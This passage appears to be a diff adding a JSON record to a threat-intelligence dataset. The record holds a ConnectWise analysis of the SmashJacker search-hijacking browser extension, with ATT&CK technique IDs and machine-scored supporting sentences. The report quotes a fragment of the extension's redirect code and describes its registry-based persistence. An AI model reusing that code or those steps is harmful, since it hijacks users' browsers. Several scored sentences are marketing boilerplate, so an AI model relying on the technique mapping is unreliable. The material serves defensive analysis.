getQuery(url);\nlocation.replace(`https://searchesmia.com/bingchr9?q=${searchQuery}`) } if (url.match(/^https?:.*?yahoo.*?\\/?search?/g) != null) { var searchQuery = getQuery(url, 'yahoo');\nlocation.replace(`https://searchesmia.com/bingchr9?q=${searchQuery}`) } } Searches routed through searchesmia[.]com will return a page meant to look like Google search results, but with different ads served on it in an attempt to generate ad revenue for the actors.\nThings get a bit more interesting when background.js contains the main logic of the extension. In these cases, we are faced with a lightly obfuscated script with more features than just search hijacking. The search hijacking is still present, but now we are faced with evasion mechanisms such as closing tabs that try to navigate to the browser's ://extensions page or chrome://settings/reset to keep the extension from being uninstalled.\nThe bigger capability we see added is the ability to redirect users from a variety of different pages they may be trying to access through actor infrastructure and back out to the originally intended page with the actor's affiliate parameters tacked onto the URL. First, for every tab update it will check if a URL contains either 7fk8qechol, which was mentioned earlier in the article as an identifier for all of their initial payload delivery URLs, or the extension's id. If either of those are present it will close the tab, otherwise it will compare the domain of the page being visited to an extensive list of domains. If there is a match, it will redirect the page navigation through https://smashaff[.]com/redirect?&url=[DOMAIN], which will process the request differently depending on the domain being requested. This is done to redirect the user back to it in an attempt for the actor to receive affiliate kickbacks. After this, the extension will set a future time for that domain in a cookie, so it won't process that domain again until that time has passed. Usually this will be 2 hours, except for an Amazon domain, which is granted a 24-hour waiting period.\nOur initial hypothesis was that this campaign represented a shift in ChromeLoader delivery methods. The usage of pages pushing pirated media to lure victims, file name conventions such as the common Your File Is Ready To Download, and the eventual payload of a search hijacking browser extension hinted in the direction of ChromeLoader. Additionally, we observed historical trends of known ChromeLoader delivery formats, from their first variants delivering AutoHotkey files, to the more popular variant delivered via disc image files. When we added on the timeline of incidents related to the installer media, we ended up with a graph that appeared to show a convincing story of shifting trends in ChromeLoader delivery media.\nOccasionally we would also find other loose connections, such as a domain and URL patterned similarly to others used by the actors behind this extension redirecting to search hijack pages patterned similarly to those used by ChromeLoader.\nBut the usage of pirated media sites and similar naming conventions aren't unique to ChromeLoader and may just be indicative of a different set of actors that offer their distribution network as a service for many different payloads. The timeline may be tainted due to lack of awareness of other changes in ChromeLoader techniques that may have affected our ability to tag related incidents. And the loose connections we found always remained loose. Additionally, during our search for ChromeLoader samples that were starting to use installers that ended up turning up results for a different malicious extension, we actually did end up finding a recent msi sample that does drop already known ChromeLoader payloads, which only muddied the waters further. It may be the case that the actors behind ChromeLoader also developed this extension and delivery path, but currently we don't have any other data that would warrant higher confidence in this hypothesis.\nWe did find other interesting connections though. One word kept recurring in various places during the investigation, Smash. Some installers quickly showed they were installing something called Smash. Many of the domains incorporate the word Smash. Particularly there is the smashbrowser[.]com domain that victims are sent to, in some cases, immediately after install. Outside of the post-install victim tracking pages, this web site also offers a browser, search results for which are full of guides on how to remove it as adware.\nThis was interesting, because during log searches for extension indicators we found another browser called Chromnius matching on a large amount of the indicators we have seen being used by SmashJacker. Search results for it also turn up mostly results referring to it as adware and suggesting its removal. Spotting the similarities between the two is left to the reader.\nFurther, through the domain smashaff[.]com we also connected the malicious extension here to a report by Guardio about a large amount of extensions available in Chrome and Edge stores very similar to the variants observed in our research.\nThese potential connections suggest a much broader operation with many possible delivery avenues and payloads, and potential connections to ChromeLoader, with the goal of generating revenue via ads and affiliate kickbacks. Adware like this may not typically gain as much attention as other malware whose impact is more immediate, but considering the massive scope of this campaign and the ability to fly more under the radar that lack of concern allows, it's always worth considering the sort of access to data in your organization these actors have even just through searches and analytics.",
+  "ID_list": [
+    "T1053.005",
+    "T1176",
+    "T1189",
+    "T1204.002",
+    "T1546.010",
+    "T1565.002"
+  ],
+  "Name_list": [
+    "Impact",
+    "Persistence",
+    "Source",
+    "Trap"
+  ],
+  "TTP_sentences": {
+    "T1053.005": [
+      {
+        "sentence": "Operate more efficiently, reduce complexity, improve EBITDA, and much more with the purpose-built platform for MSPs.",
+        "score": 0.4012
+      },
+      {
+        "sentence": "Leverage generative AI and RPA workflows to simplify and streamline the most time-consuming parts of IT.",
+        "score": 0.4319
+      },
+      {
+        "sentence": "Pivoting off the indicators from these findings, the CRU uncovered a campaign spanning back to at least October of 2022 pushing a persistent Chromium extension via software, game, and movie pirating web pages that we are referring to as SmashJacker.",
+        "score": 0.3196
+      },
+      {
+        "sentence": "Throughout our analysis, we found mostly InnoSetup and MSI installers being used to deliver this malicious extension.",
+        "score": 0.3333
+      },
+      {
+        "sentence": "The MSI installers were all trojanized versions of 7zip that would deliver the extension along with a legitimate install of the archiving tool.",
+        "score": 0.3255
+      },
+      {
+        "sentence": "Soon after launching the installer, it gets to work on persisting.",
+        "score": 0.3744
+      },
+      {
+        "sentence": "We found two persistence techniques in use depending on the variant downloaded.",
+        "score": 0.36
+      },
+      {
+        "sentence": "Then it will create a batch file for running the proper browser with the malicious extension loaded.",
+        "score": 0.4304
+      },
+      {
+        "sentence": "In other instances, the installer will drop and run an executable that takes responsibility for its own persistence.",
+        "score": 0.4504
+      },
+      {
+        "sentence": "Then it will use taskkill to kill running browsers.",
+        "score": 0.4228
+      },
+      {
+        "sentence": "Then it restarts the targeted browser and passes it a path to a bootstrapping extension through the --load-extension parameter.",
+        "score": 0.3301
+      },
+      {
+        "sentence": "This is a smaller browser extension with two files usually called service.js and web.js.",
+        "score": 0.3005
+      },
+      {
+        "sentence": "This extension's whole purpose is to ensure the main extension gets loaded into the browser after being set in the registry. service.js adds a listener for installed extensions so that when its own installation triggers, it will open a tab with the chrome://policy page and call a function in web.js.",
+        "score": 0.344
+      },
+      {
+        "sentence": "Meanwhile, the batch script is checking if the extension is installed yet, afterwards it will add its extension id to the browser's ExtensionInstallForcelist registry key, then kill the browser and restart it again without the bootstrapping extension loaded.",
+        "score": 0.3362
+      },
+      {
+        "sentence": "In the dll versions of the extension there is no .crx file or bootstrapping extension, just what would be the contents of the .crx file.",
+        "score": 0.3258
+      },
+      {
+        "sentence": "Immediately after the installation is completed, the targeted browser is then opened directly to an actor-controlled page: \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" https://getfiles[.]wiki/welcome.php This will be a part of a redirection chain through pages such as https://exturl[.]com/r.php?key=[KEY] or https://offersss[.]click/r.php?payout=OPTIONAL&cnv_id=[ID].",
+        "score": 0.4323
+      },
+      {
+        "sentence": "The extension itself usually consists of three main components that can vary between samples.",
+        "score": 0.3308
+      },
+      {
+        "sentence": "There is the manifest.json file, which is common to all Chromium extensions.",
+        "score": 0.315
+      },
+      {
+        "sentence": "Several versions of this file consistently list the author as sg.guru1030@gmail[.]com, and many will use the chrome_settings_overrides configuration to change the default search provider for the browser to searchesmia[.]com.",
+        "score": 0.3245
+      },
+      {
+        "sentence": "The main logic of the extension is in one of the remaining two main components, sometimes in background.js and other times in content.js.",
+        "score": 0.3759
+      },
+      {
+        "sentence": "Things get a bit more interesting when background.js contains the main logic of the extension.",
+        "score": 0.3766
+      },
+      {
+        "sentence": "In these cases, we are faced with a lightly obfuscated script with more features than just search hijacking.",
+        "score": 0.3846
+      },
+      {
+        "sentence": "The search hijacking is still present, but now we are faced with evasion mechanisms such as closing tabs that try to navigate to the browser's ://extensions page or chrome://settings/reset to keep the extension from being uninstalled.",
+        "score": 0.3432
+      },
+      {
+        "sentence": "After this, the extension will set a future time for that domain in a cookie, so it won't process that domain again until that time has passed.",
+        "score": 0.3358
+      },
+      {
+        "sentence": "Usually this will be 2 hours, except for an Amazon domain, which is granted a 24-hour waiting period.",
+        "score": 0.3821
+      },
+      {
+        "sentence": "Additionally, we observed historical trends of known ChromeLoader delivery formats, from their first variants delivering AutoHotkey files, to the more popular variant delivered via disc image files.",
+        "score": 0.3427
+      },
+      {
+        "sentence": "When we added on the timeline of incidents related to the installer media, we ended up with a graph that appeared to show a convincing story of shifting trends in ChromeLoader delivery media.",
+        "score": 0.3142
+      },
+      {
+        "sentence": "Occasionally we would also find other loose connections, such as a domain and URL patterned similarly to others used by the actors behind this extension redirecting to search hijack pages patterned similarly to those used by ChromeLoader.",
+        "score": 0.3229
+      },
+      {
+        "sentence": "But the usage of pirated media sites and similar naming conventions aren't unique to ChromeLoader and may just be indicative of a different set of actors that offer their distribution network as a service for many different payloads.",
+        "score": 0.3162
+      },
+      {
+        "sentence": "The timeline may be tainted due to lack of awareness of other changes in ChromeLoader techniques that may have affected our ability to tag related incidents.",
+        "score": 0.3931
+      },
+      {
+        "sentence": "Additionally, during our search for ChromeLoader samples that were starting to use installers that ended up turning up results for a different malicious extension, we actually did end up finding a recent msi sample that does drop already known ChromeLoader payloads, which only muddied the waters further.",
+        "score": 0.3246
+      },
+      {
+        "sentence": "Particularly there is the smashbrowser[.]com domain that victims are sent to, in some cases, immediately after install.",
+        "score": 0.3611
+      },
+      {
+        "sentence": "Outside of the post-install victim tracking pages, this web site also offers a browser, search results for which are full of guides on how to remove it as adware.",
+        "score": 0.3509
+      }
+    ],
+    "T1176": [
+      {
+        "sentence": "Operate more efficiently, reduce complexity, improve EBITDA, and much more with the purpose-built platform for MSPs.",
+        "score": 0.3917
+      },
+      {
+        "sentence": "Protect and defend what matters most to your clients and stakeholders with ConnectWise's best-in-class cybersecurity and BCDR solutions.",
+        "score": 0.3224
+      },
+      {
+        "sentence": "Leverage generative AI and RPA workflows to simplify and streamline the most time-consuming parts of IT.",
+        "score": 0.3465
+      },
+      {
+        "sentence": "Check out our online learning platform, designed to help IT service providers get the most out of ConnectWise products and services.",
+        "score": 0.418
+      },
+      {
+        "sentence": "Search our resource center for the latest MSP ebooks, white papers, infographics, webinars and more!",
+        "score": 0.3724
+      },
+      {
+        "sentence": "Join hundreds of thousands of IT professionals benefiting from and contributing to a legacy of industry leadership when you become a part of the ConnectWise community.",
+        "score": 0.3789
+      },
+      {
+        "sentence": "Join hundreds of thousands of IT professionals benefiting from and contributing to a legacy of industry leadership when you become a part of the ConnectWise community.",
+        "score": 0.3789
+      },
+      {
+        "sentence": "In February and March, we noticed a surge in incidents all relating to a few different files that hadn't been connected to any type of malware yet.",
+        "score": 0.5237
+      },
+      {
+        "sentence": "Pivoting off the indicators from these findings, the CRU uncovered a campaign spanning back to at least October of 2022 pushing a persistent Chromium extension via software, game, and movie pirating web pages that we are referring to as SmashJacker.",
+        "score": 0.576
+      },
+      {
+        "sentence": "This extension is used to hijack searches and push users through redirect chains to the domains they're navigating so the actors can receive affiliate kickbacks for \"directing\" the user to that site, generate ad revenue, and collect analytics on victims.",
+        "score": 0.4308
+      },
+      {
+        "sentence": "Users are lured to download the installer files by having them hosted on pages advertising the download of wallpapers, software, games, and movies, typically illegally.",
+        "score": 0.5161
+      },
+      {
+        "sentence": "They are first served the malicious installer, but then trying the download again will serve the proper file.",
+        "score": 0.4355
+      },
+      {
+        "sentence": "It's worth noting that in all the URLs leading to an installer download contain the empty URL parameter 7fk8qechol=.",
+        "score": 0.4735
+      },
+      {
+        "sentence": "This is a useful indicator and is referenced by the extension later.",
+        "score": 0.4104
+      },
+      {
+        "sentence": "Throughout our analysis, we found mostly InnoSetup and MSI installers being used to deliver this malicious extension.",
+        "score": 0.648
+      },
+      {
+        "sentence": "The MSI installers were all trojanized versions of 7zip that would deliver the extension along with a legitimate install of the archiving tool.",
+        "score": 0.5874
+      },
+      {
+        "sentence": "InnoSetup installers only installed the extension, but masqueraded as either one of the types of files outlined above or were simply named Your File Is Ready To Download.exe.",
+        "score": 0.5118
+      },
+      {
+        "sentence": "Both versions deliver similar payloads, and in some cases, if a targeted browser isn't found, nothing will be dropped.",
+        "score": 0.411
+      },
+      {
+        "sentence": "Most of the samples were signed using a handful of different certificates.",
+        "score": 0.4853
+      },
+      {
+        "sentence": "Soon after launching the installer, it gets to work on persisting.",
+        "score": 0.4045
+      },
+      {
+        "sentence": "We found two persistence techniques in use depending on the variant downloaded.",
+        "score": 0.4572
+      },
+      {
+        "sentence": "Then it will create a batch file for running the proper browser with the malicious extension loaded.",
+        "score": 0.3182
+      },
+      {
+        "sentence": "In other instances, the installer will drop and run an executable that takes responsibility for its own persistence.",
+        "score": 0.4932
+      },
+      {
+        "sentence": "Then it restarts the targeted browser and passes it a path to a bootstrapping extension through the --load-extension parameter.",
+        "score": 0.4703
+      },
+      {
+        "sentence": "This is a smaller browser extension with two files usually called service.js and web.js.",
+        "score": 0.5147
+      },
+      {
+        "sentence": "This extension's whole purpose is to ensure the main extension gets loaded into the browser after being set in the registry. service.js adds a listener for installed extensions so that when its own installation triggers, it will open a tab with the chrome://policy page and call a function in web.js.",
+        "score": 0.485
+      },
+      {
+        "sentence": "This function adds a listener for when the chrome://policy page loads and clicks the reload policies button to ensure the policy registry keys modified earlier are loaded into the browser.",
+        "score": 0.3348
+      },
+      {
+        "sentence": "Meanwhile, the batch script is checking if the extension is installed yet, afterwards it will add its extension id to the browser's ExtensionInstallForcelist registry key, then kill the browser and restart it again without the bootstrapping extension loaded.",
+        "score": 0.323
+      },
+      {
+        "sentence": "In the dll versions of the extension there is no .crx file or bootstrapping extension, just what would be the contents of the .crx file.",
+        "score": 0.5032
+      },
+      {
+        "sentence": "Immediately after the installation is completed, the targeted browser is then opened directly to an actor-controlled page: \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" https://getfiles[.]wiki/welcome.php This will be a part of a redirection chain through pages such as https://exturl[.]com/r.php?key=[KEY] or https://offersss[.]click/r.php?payout=OPTIONAL&cnv_id=[ID].",
+        "score": 0.4918
+      },
+      {
+        "sentence": "The extension itself usually consists of three main components that can vary between samples.",
+        "score": 0.5222
+      },
+      {
+        "sentence": "There is the manifest.json file, which is common to all Chromium extensions.",
+        "score": 0.5194
+      },
+      {
+        "sentence": "Several versions of this file consistently list the author as sg.guru1030@gmail[.]com, and many will use the chrome_settings_overrides configuration to change the default search provider for the browser to searchesmia[.]com.",
+        "score": 0.3625
+      },
+      {
+        "sentence": "The main logic of the extension is in one of the remaining two main components, sometimes in background.js and other times in content.js.",
+        "score": 0.4749
+      },
+      {
+        "sentence": "When the main logic is in content.js, then usually it just contains a simple search hijacking script that replaces common search engine query URLs with queries to searchesmia[.]com.",
+        "score": 0.3077
+      },
+      {
+        "sentence": "An example is included below.",
+        "score": 0.3137
+      },
+      {
+        "sentence": "We observed samples targeting Google, DuckDuckGo, Ecosia, Yahoo, Ask, Neeva, Aol, Webcrawler, Dogpile, Bing, and Info.",
+        "score": 0.3409
+      },
+      {
+        "sentence": "Things get a bit more interesting when background.js contains the main logic of the extension.",
+        "score": 0.4711
+      },
+      {
+        "sentence": "In these cases, we are faced with a lightly obfuscated script with more features than just search hijacking.",
+        "score": 0.3724
+      },
+      {
+        "sentence": "The search hijacking is still present, but now we are faced with evasion mechanisms such as closing tabs that try to navigate to the browser's ://extensions page or chrome://settings/reset to keep the extension from being uninstalled.",
+        "score": 0.4517
+      },
+      {
+        "sentence": "The bigger capability we see added is the ability to redirect users from a variety of different pages they may be trying to access through actor infrastructure and back out to the originally intended page with the actor's affiliate parameters tacked onto the URL.",
+        "score": 0.3611
+      },
+      {
+        "sentence": "First, for every tab update it will check if a URL contains either 7fk8qechol, which was mentioned earlier in the article as an identifier for all of their initial payload delivery URLs, or the extension's id.",
+        "score": 0.3925
+      },
+      {
+        "sentence": "This is done to redirect the user back to it in an attempt for the actor to receive affiliate kickbacks.",
+        "score": 0.3543
+      },
+      {
+        "sentence": "Usually this will be 2 hours, except for an Amazon domain, which is granted a 24-hour waiting period.",
+        "score": 0.3503
+      },
+      {
+        "sentence": "Our initial hypothesis was that this campaign represented a shift in ChromeLoader delivery methods.",
+        "score": 0.4072
+      },
+      {
+        "sentence": "The usage of pages pushing pirated media to lure victims, file name conventions such as the common Your File Is Ready To Download, and the eventual payload of a search hijacking browser extension hinted in the direction of ChromeLoader.",
+        "score": 0.5816
+      },
+      {
+        "sentence": "Additionally, we observed historical trends of known ChromeLoader delivery formats, from their first variants delivering AutoHotkey files, to the more popular variant delivered via disc image files.",
+        "score": 0.4879
+      },
+      {
+        "sentence": "When we added on the timeline of incidents related to the installer media, we ended up with a graph that appeared to show a convincing story of shifting trends in ChromeLoader delivery media.",
+        "score": 0.5064
+      },
+      {
+        "sentence": "Occasionally we would also find other loose connections, such as a domain and URL patterned similarly to others used by the actors behind this extension redirecting to search hijack pages patterned similarly to those used by ChromeLoader.",
+        "score": 0.4682
+      },
+      {
+        "sentence": "But the usage of pirated media sites and similar naming conventions aren't unique to ChromeLoader and may just be indicative of a different set of actors that offer their distribution network as a service for many different payloads.",
+        "score": 0.462
+      },
+      {
+        "sentence": "The timeline may be tainted due to lack of awareness of other changes in ChromeLoader techniques that may have affected our ability to tag related incidents.",
+        "score": 0.4541
+      },
+      {
+        "sentence": "And the loose connections we found always remained loose.",
+        "score": 0.3404
+      },
+      {
+        "sentence": "Additionally, during our search for ChromeLoader samples that were starting to use installers that ended up turning up results for a different malicious extension, we actually did end up finding a recent msi sample that does drop already known ChromeLoader payloads, which only muddied the waters further.",
+        "score": 0.6524
+      },
+      {
+        "sentence": "It may be the case that the actors behind ChromeLoader also developed this extension and delivery path, but currently we don't have any other data that would warrant higher confidence in this hypothesis.",
+        "score": 0.5673
+      },
+      {
+        "sentence": "We did find other interesting connections though.",
+        "score": 0.3379
+      },
+      {
+        "sentence": "Some installers quickly showed they were installing something called Smash.",
+        "score": 0.4368
+      },
+      {
+        "sentence": "Particularly there is the smashbrowser[.]com domain that victims are sent to, in some cases, immediately after install.",
+        "score": 0.4806
+      },
+      {
+        "sentence": "Outside of the post-install victim tracking pages, this web site also offers a browser, search results for which are full of guides on how to remove it as adware.",
+        "score": 0.5252
+      },
+      {
+        "sentence": "This was interesting, because during log searches for extension indicators we found another browser called Chromnius matching on a large amount of the indicators we have seen being used by SmashJacker.",
+        "score": 0.492
+      },
+      {
+        "sentence": "Search results for it also turn up mostly results referring to it as adware and suggesting its removal.",
+        "score": 0.4521
+      },
+      {
+        "sentence": "Spotting the similarities between the two is left to the reader.",
+        "score": 0.3933
+      },
+      {
+        "sentence": "Further, through the domain smashaff[.]com we also connected the malicious extension here to a report by Guardio about a large amount of extensions available in Chrome and Edge stores very similar to the variants observed in our research.",
+        "score": 0.6346
+      },
+      {
+        "sentence": "These potential connections suggest a much broader operation with many possible delivery avenues and payloads, and potential connections to ChromeLoader, with the goal of generating revenue via ads and affiliate kickbacks.",
+        "score": 0.488
+      }
+    ],
+    "T1189": [
+      {
+        "sentence": "Operate more efficiently, reduce complexity, improve EBITDA, and much more with the purpose-built platform for MSPs.",
+        "score": 0.3012
+      },
+      {
+        "sentence": "Protect and defend what matters most to your clients and stakeholders with ConnectWise's best-in-class cybersecurity and BCDR solutions.",
+        "score": 0.3018
+      },
+      {
+        "sentence": "Leverage generative AI and RPA workflows to simplify and streamline the most time-consuming parts of IT.",
+        "score": 0.3297
+      },
+      {
+        "sentence": "Check out our online learning platform, designed to help IT service providers get the most out of ConnectWise products and services.",
+        "score": 0.3529
+      },
+      {
+        "sentence": "Search our resource center for the latest MSP ebooks, white papers, infographics, webinars and more!",
+        "score": 0.4015
+      },
+      {
+        "sentence": "Join hundreds of thousands of IT professionals benefiting from and contributing to a legacy of industry leadership when you become a part of the ConnectWise community.",
+        "score": 0.3081
+      },
+      {
+        "sentence": "Join hundreds of thousands of IT professionals benefiting from and contributing to a legacy of industry leadership when you become a part of the ConnectWise community.",
+        "score": 0.3081
+      },
+      {
+        "sentence": "In February and March, we noticed a surge in incidents all relating to a few different files that hadn't been connected to any type of malware yet.",
+        "score": 0.4215
+      },
+      {
+        "sentence": "Pivoting off the indicators from these findings, the CRU uncovered a campaign spanning back to at least October of 2022 pushing a persistent Chromium extension via software, game, and movie pirating web pages that we are referring to as SmashJacker.",
+        "score": 0.6246
+      },
+      {
+        "sentence": "This extension is used to hijack searches and push users through redirect chains to the domains they're navigating so the actors can receive affiliate kickbacks for \"directing\" the user to that site, generate ad revenue, and collect analytics on victims.",
+        "score": 0.562
+      },
+      {
+        "sentence": "Users are lured to download the installer files by having them hosted on pages advertising the download of wallpapers, software, games, and movies, typically illegally.",
+        "score": 0.4888
+      },
+      {
+        "sentence": "They are first served the malicious installer, but then trying the download again will serve the proper file.",
+        "score": 0.5044
+      },
+      {
+        "sentence": "It's worth noting that in all the URLs leading to an installer download contain the empty URL parameter 7fk8qechol=.",
+        "score": 0.4864
+      },
+      {
+        "sentence": "Throughout our analysis, we found mostly InnoSetup and MSI installers being used to deliver this malicious extension.",
+        "score": 0.4832
+      },
+      {
+        "sentence": "The MSI installers were all trojanized versions of 7zip that would deliver the extension along with a legitimate install of the archiving tool.",
+        "score": 0.3435
+      },
+      {
+        "sentence": "InnoSetup installers only installed the extension, but masqueraded as either one of the types of files outlined above or were simply named Your File Is Ready To Download.exe.",
+        "score": 0.3828
+      },
+      {
+        "sentence": "Both versions deliver similar payloads, and in some cases, if a targeted browser isn't found, nothing will be dropped.",
+        "score": 0.5615
+      },
+      {
+        "sentence": "Soon after launching the installer, it gets to work on persisting.",
+        "score": 0.3031
+      },
+      {
+        "sentence": "We found two persistence techniques in use depending on the variant downloaded.",
+        "score": 0.3781
+      },
+      {
+        "sentence": "Then it will create a batch file for running the proper browser with the malicious extension loaded.",
+        "score": 0.4391
+      },
+      {
+        "sentence": "In other instances, the installer will drop and run an executable that takes responsibility for its own persistence.",
+        "score": 0.4348
+      },
+      {
+        "sentence": "Then it restarts the targeted browser and passes it a path to a bootstrapping extension through the --load-extension parameter.",
+        "score": 0.5262
+      },
+      {
+        "sentence": "This is a smaller browser extension with two files usually called service.js and web.js.",
+        "score": 0.426
+      },
+      {
+        "sentence": "This extension's whole purpose is to ensure the main extension gets loaded into the browser after being set in the registry. service.js adds a listener for installed extensions so that when its own installation triggers, it will open a tab with the chrome://policy page and call a function in web.js.",
+        "score": 0.3714
+      },
+      {
+        "sentence": "This function adds a listener for when the chrome://policy page loads and clicks the reload policies button to ensure the policy registry keys modified earlier are loaded into the browser.",
+        "score": 0.3614
+      },
+      {
+        "sentence": "In the dll versions of the extension there is no .crx file or bootstrapping extension, just what would be the contents of the .crx file.",
+        "score": 0.3535
+      },
+      {
+        "sentence": "Immediately after the installation is completed, the targeted browser is then opened directly to an actor-controlled page: \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" https://getfiles[.]wiki/welcome.php This will be a part of a redirection chain through pages such as https://exturl[.]com/r.php?key=[KEY] or https://offersss[.]click/r.php?payout=OPTIONAL&cnv_id=[ID].",
+        "score": 0.6686
+      },
+      {
+        "sentence": "These end up redirecting to Google after gathering data about users through trackers such as histats and dtscout.",
+        "score": 0.3447
+      },
+      {
+        "sentence": "The extension itself usually consists of three main components that can vary between samples.",
+        "score": 0.3735
+      },
+      {
+        "sentence": "There is the manifest.json file, which is common to all Chromium extensions.",
+        "score": 0.3655
+      },
+      {
+        "sentence": "The main logic of the extension is in one of the remaining two main components, sometimes in background.js and other times in content.js.",
+        "score": 0.5008
+      },
+      {
+        "sentence": "When the main logic is in content.js, then usually it just contains a simple search hijacking script that replaces common search engine query URLs with queries to searchesmia[.]com.",
+        "score": 0.405
+      },
+      {
+        "sentence": "An example is included below.",
+        "score": 0.4233
+      },
+      {
+        "sentence": "We observed samples targeting Google, DuckDuckGo, Ecosia, Yahoo, Ask, Neeva, Aol, Webcrawler, Dogpile, Bing, and Info.",
+        "score": 0.378
+      },
+      {
+        "sentence": "Things get a bit more interesting when background.js contains the main logic of the extension.",
+        "score": 0.4689
+      },
+      {
+        "sentence": "In these cases, we are faced with a lightly obfuscated script with more features than just search hijacking.",
+        "score": 0.388
+      },
+      {
+        "sentence": "The search hijacking is still present, but now we are faced with evasion mechanisms such as closing tabs that try to navigate to the browser's ://extensions page or chrome://settings/reset to keep the extension from being uninstalled.",
+        "score": 0.4157
+      },
+      {
+        "sentence": "The bigger capability we see added is the ability to redirect users from a variety of different pages they may be trying to access through actor infrastructure and back out to the originally intended page with the actor's affiliate parameters tacked onto the URL.",
+        "score": 0.5349
+      },
+      {
+        "sentence": "First, for every tab update it will check if a URL contains either 7fk8qechol, which was mentioned earlier in the article as an identifier for all of their initial payload delivery URLs, or the extension's id.",
+        "score": 0.4619
+      },
+      {
+        "sentence": "If either of those are present it will close the tab, otherwise it will compare the domain of the page being visited to an extensive list of domains.",
+        "score": 0.3569
+      },
+      {
+        "sentence": "If there is a match, it will redirect the page navigation through https://smashaff[.]com/redirect?&url=[DOMAIN], which will process the request differently depending on the domain being requested.",
+        "score": 0.4144
+      },
+      {
+        "sentence": "This is done to redirect the user back to it in an attempt for the actor to receive affiliate kickbacks.",
+        "score": 0.4491
+      },
+      {
+        "sentence": "Usually this will be 2 hours, except for an Amazon domain, which is granted a 24-hour waiting period.",
+        "score": 0.3066
+      },
+      {
+        "sentence": "Our initial hypothesis was that this campaign represented a shift in ChromeLoader delivery methods.",
+        "score": 0.5176
+      },
+      {
+        "sentence": "The usage of pages pushing pirated media to lure victims, file name conventions such as the common Your File Is Ready To Download, and the eventual payload of a search hijacking browser extension hinted in the direction of ChromeLoader.",
+        "score": 0.5505
+      },
+      {
+        "sentence": "Additionally, we observed historical trends of known ChromeLoader delivery formats, from their first variants delivering AutoHotkey files, to the more popular variant delivered via disc image files.",
+        "score": 0.5483
+      },
+      {
+        "sentence": "When we added on the timeline of incidents related to the installer media, we ended up with a graph that appeared to show a convincing story of shifting trends in ChromeLoader delivery media.",
+        "score": 0.4959
+      },
+      {
+        "sentence": "Occasionally we would also find other loose connections, such as a domain and URL patterned similarly to others used by the actors behind this extension redirecting to search hijack pages patterned similarly to those used by ChromeLoader.",
+        "score": 0.5229
+      },
+      {
+        "sentence": "But the usage of pirated media sites and similar naming conventions aren't unique to ChromeLoader and may just be indicative of a different set of actors that offer their distribution network as a service for many different payloads.",
+        "score": 0.4588
+      },
+      {
+        "sentence": "The timeline may be tainted due to lack of awareness of other changes in ChromeLoader techniques that may have affected our ability to tag related incidents.",
+        "score": 0.3791
+      },
+      {
+        "sentence": "And the loose connections we found always remained loose.",
+        "score": 0.3299
+      },
+      {
+        "sentence": "Additionally, during our search for ChromeLoader samples that were starting to use installers that ended up turning up results for a different malicious extension, we actually did end up finding a recent msi sample that does drop already known ChromeLoader payloads, which only muddied the waters further.",
+        "score": 0.5723
+      },
+      {
+        "sentence": "It may be the case that the actors behind ChromeLoader also developed this extension and delivery path, but currently we don't have any other data that would warrant higher confidence in this hypothesis.",
+        "score": 0.5608
+      },
+      {
+        "sentence": "We did find other interesting connections though.",
+        "score": 0.3578
+      },
+      {
+        "sentence": "Particularly there is the smashbrowser[.]com domain that victims are sent to, in some cases, immediately after install.",
+        "score": 0.5797
+      },
+      {
+        "sentence": "Outside of the post-install victim tracking pages, this web site also offers a browser, search results for which are full of guides on how to remove it as adware.",
+        "score": 0.4253
+      },
+      {
+        "sentence": "This was interesting, because during log searches for extension indicators we found another browser called Chromnius matching on a large amount of the indicators we have seen being used by SmashJacker.",
+        "score": 0.3385
+      },
+      {
+        "sentence": "Search results for it also turn up mostly results referring to it as adware and suggesting its removal.",
+        "score": 0.3357
+      },
+      {
+        "sentence": "Spotting the similarities between the two is left to the reader.",
+        "score": 0.4109
+      },
+      {
+        "sentence": "Further, through the domain smashaff[.]com we also connected the malicious extension here to a report by Guardio about a large amount of extensions available in Chrome and Edge stores very similar to the variants observed in our research.",
+        "score": 0.5645
+      },
+      {
+        "sentence": "These potential connections suggest a much broader operation with many possible delivery avenues and payloads, and potential connections to ChromeLoader, with the goal of generating revenue via ads and affiliate kickbacks.",
+        "score": 0.5938
+      }
+    ],
+    "T1565.002": [
+      {
+        "sentence": "Operate more efficiently, reduce complexity, improve EBITDA, and much more with the purpose-built platform for MSPs.",
+        "score": 0.3551
+      },
+      {
+        "sentence": "Join hundreds of thousands of IT professionals benefiting from and contributing to a legacy of industry leadership when you become a part of the ConnectWise community.",
+        "score": 0.3333
+      },
+      {
+        "sentence": "Join hundreds of thousands of IT professionals benefiting from and contributing to a legacy of industry leadership when you become a part of the ConnectWise community.",
+        "score": 0.3333
+      },
+      {
+        "sentence": "In February and March, we noticed a surge in incidents all relating to a few different files that hadn't been connected to any type of malware yet.",
+        "score": 0.4022
+      },
+      {
+        "sentence": "Pivoting off the indicators from these findings, the CRU uncovered a campaign spanning back to at least October of 2022 pushing a persistent Chromium extension via software, game, and movie pirating web pages that we are referring to as SmashJacker.",
+        "score": 0.3406
+      },
+      {
+        "sentence": "This extension is used to hijack searches and push users through redirect chains to the domains they're navigating so the actors can receive affiliate kickbacks for \"directing\" the user to that site, generate ad revenue, and collect analytics on victims.",
+        "score": 0.3094
+      },
+      {
+        "sentence": "This is a useful indicator and is referenced by the extension later.",
+        "score": 0.3178
+      },
+      {
+        "sentence": "The MSI installers were all trojanized versions of 7zip that would deliver the extension along with a legitimate install of the archiving tool.",
+        "score": 0.3323
+      },
+      {
+        "sentence": "We found two persistence techniques in use depending on the variant downloaded.",
+        "score": 0.3095
+      },
+      {
+        "sentence": "In the dll versions of the extension there is no .crx file or bootstrapping extension, just what would be the contents of the .crx file.",
+        "score": 0.3877
+      },
+      {
+        "sentence": "The extension itself usually consists of three main components that can vary between samples.",
+        "score": 0.4642
+      },
+      {
+        "sentence": "An example is included below.",
+        "score": 0.3516
+      },
+      {
+        "sentence": "Things get a bit more interesting when background.js contains the main logic of the extension.",
+        "score": 0.3307
+      },
+      {
+        "sentence": "In these cases, we are faced with a lightly obfuscated script with more features than just search hijacking.",
+        "score": 0.3275
+      },
+      {
+        "sentence": "Our initial hypothesis was that this campaign represented a shift in ChromeLoader delivery methods.",
+        "score": 0.3639
+      },
+      {
+        "sentence": "The usage of pages pushing pirated media to lure victims, file name conventions such as the common Your File Is Ready To Download, and the eventual payload of a search hijacking browser extension hinted in the direction of ChromeLoader.",
+        "score": 0.3108
+      },
+      {
